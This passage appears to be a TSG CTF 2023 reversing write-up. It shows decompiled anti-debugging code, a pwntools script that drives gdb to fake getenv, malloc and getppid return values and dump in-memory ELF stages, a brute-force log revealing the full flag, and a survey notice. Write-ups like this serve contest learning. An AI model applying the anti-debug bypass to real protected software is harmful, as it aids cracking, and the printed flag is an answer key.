 || ptrace(PTRACE_ATTACH, ppid, 0LL, 0LL) == -1
 || ptrace(PTRACE_ATTACH, ppid, 0LL, 0LL) != -1
 || ptrace(PTRACE_ATTACH, ppid, 0LL, 0LL) != -1 )
 {
locPrintNgAndExit:
 PrintNgAndExit();
 }
 kill(ppid, SIGSTOP);
 waitpid(ppid, 0LL, 0);
 ptrace(PTRACE_DETACH, ppid, 0LL, 0LL);
 kill(ppid, SIGCONT);
 v7 = syscall(319LL, "", 3LL);
 write(v7, buf, (size_t)&unk_7B083);
 sprintf(s, "/proc/self/fd/%d", v7);
 ++a2[1];
 execv(s, a2);
 return 0LL;
}
#!/usr/bin/env python3

import pwn
import sys
import string
import os
import subprocess

# pwn.context.log_level = "DEBUG"

def extract_core(elf_path:
str, next_elf_path_to_save:
str, flag_to_input:
str)->bool:
 prompt = b"(gdb)" # 環境に合わせて定義調整してください
 # prompt = b"gdb-peda$"
 with pwn.process(["gdb", "-q", "-n", "--args", "./"+elf_path, flag_to_input]) as io:
 def extract_register_value(register_name:
bytes)->int:
 io.sendlineafter(prompt, b"info register %s" % register_name)
 line = io.recvline_contains(register_name)
 return int(line.split()[1], 16)

 # main関数へbreakを貼る
 io.sendlineafter(prompt, b"set breakpoint pending on") # peda使用環境は自動的にoffにしているかもしれない
 io.sendlineafter(prompt, b"b __libc_start_main")
 io.sendlineafter(prompt, b"run") # 入力フラグはgdb起動時の--argsコマンドで指定済み(runコマンドで指定しようとすると各種記号のエスケープが大変)
 io.sendlineafter(prompt, b"b *$rdi") # main関数へbreakポイントを貼る
 io.sendlineafter(prompt, b"continue")

 # 現在main関数、ようやく色々ブレークポイントを貼れたりするはず
 # 22個目くらいで、getenv("LINES")等にNULLを返させる必要がある。しかし「unset environment LINES」などをしてもどうにも"60"が返ってしまう。戻り値改変万歳。
 # 27個目くらいで、「(_BYTE *)malloc(0x10uLL) - (_BYTE *)&unk_E2061 <= (__int64)&unk_20000」でもngになる。適当に大きな値にする。malloc結果は未使用
 # 60個目くらいで、getppid結果に対してptraceとかkillとかwaitpidとか色々やってる、getppid結果を改ざんする
 io.sendlineafter(prompt, b"b write")
 io.sendlineafter(prompt, b"b getenv")
 io.sendlineafter(prompt, b"b malloc")
 io.sendlineafter(prompt, b"b getppid")
 io.sendlineafter(prompt, b"continue")

 victim_process = None
 # どこかでブレークしているか、なにかバグってて終了しているはず
 while True:
 io.sendlineafter(prompt, b"info register $rip")
 received = io.recvuntil(prompt)
 io.sendline(b"") # promptを改めて受信する
 if b"ng\n" in received:
 return False
 elif b"getenv" in received:
 # 戻り値をNULLへ改変する
 io.sendlineafter(prompt, b"fin")
 io.sendlineafter(prompt, b"set $rax=0")
 io.sendlineafter(prompt, b"continue")
 elif b"malloc" in received:
 # 雑に全部置き換えると通常用途で大変なことになるのでサイズを見て適当に置き換え
 size_to_allocate = extract_register_value(b"rdi")
 if size_to_allocate != 0x10:
 # puts中の通常利用らしいので続行
 io.sendlineafter(prompt, b"continue")
 else:
 # 戻り値改ざん
 print(f"malloc({size_to_allocate:
08x})")
 io.sendlineafter(prompt, b"fin")
 io.sendlineafter(prompt, b"set $rax=0x8000000000000000")
 io.sendlineafter(prompt, b"continue")
 elif b"getppid" in received:
 # 戻り値を適当なプロセスへ改変する
 victim_process = subprocess.Popen("cat", shell=False)
 print(f"Spawnd process id: {victim_process.pid}")
 io.sendlineafter(prompt, b"fin")
 io.sendlineafter(prompt, b"set $rax=%s" % str(victim_process.pid).encode())
 io.sendlineafter(prompt, b"continue")
 else:
 break

 if victim_process:
 victim_process.kill()
 # write関数でブレークしているはずなので書き込み内容をダンプ
 addr_new_elf = extract_register_value(b"rsi")
 size_new_elf = extract_register_value(b"rdx")
 # こっちでもng判定が必要なはず
 if size_new_elf <= 3:
 return False
 io.sendlineafter(prompt, b"dump binary memory %s %s %s" % (next_elf_path_to_save.encode(), str(addr_new_elf).encode(), str(addr_new_elf + size_new_elf).encode()))
 io.sendlineafter(prompt, b"quit")
 return True

def solve():
 original_file_name = "t_the_weakest"
 flag = bytearray()
 candidates = "".join(map(chr, range(0x20, 0x7f)))

 count = 1
 current_file_name = original_file_name
 next_file_name = f"{original_file_name}_{count}"
 while b"}" not in flag:
 for c in candidates:
 print(f"{count = }, {c = }")
 if extract_core(current_file_name, next_file_name, c):
 count += 1
 current_file_name = next_file_name
 next_file_name = f"{original_file_name}_{count}"
 flag.append(ord(c))
 print(flag)
 break
 else:
 raise Exception("Can not found flag...")
solve()
$ time ./solve.py
count = 1, c = ' '
[+] Starting local process '/usr/bin/gdb': pid 3320
[*] Stopped process '/usr/bin/gdb' (pid 3320)
count = 1, c = '!'
[+] Starting local process '/usr/bin/gdb': pid 3338
(中略)
count = 100, c = '{'
[+] Starting local process '/usr/bin/gdb': pid 3264
[*] Stopped process '/usr/bin/gdb' (pid 3264)
count = 100, c = '|'
[+] Starting local process '/usr/bin/gdb': pid 3282
[*] Stopped process '/usr/bin/gdb' (pid 3282)
count = 100, c = '}'
[+] Starting local process '/usr/bin/gdb': pid 3300
[*] Stopped process '/usr/bin/gdb' (pid 3300)
bytearray(b'TSGCTF{hint_do_scripting_RdJ5GNjKkUidxjcGN4o7j5Wxz1Feo19Q0_hop3_you_did_no7_s0lve_manu4l1y_vNbwVTKw}')
./solve.py 2104.89s user 228.59s system 94% cpu 41:10.62 total
$
$ time ./t_the_weakest 'TSGCTF{hint_do_scripting_RdJ5GNjKkUidxjcGN4o7j5Wxz1Feo19Q0_hop3_you_did_no7_s0lve_manu4l1y_vNbwVTKw}'
🎉
./t_the_weakest 0.67s user 0.07s system 93% cpu 0.797 total
$
TSG CTF 2023に参加いただきありがとうございます！！🥰

今後の参考とするため、アンケートへのご協力をお願いします。

アンケート回答後に表示されるフラグを提出することで、1ポイントを獲得できます。

なお、この問題への提出はタイブレークに用いられる「最終提出時間」には影響しないため、コンテスト中お好きな時間に回答いただいても不利になることはありません。

(URL省略)
```
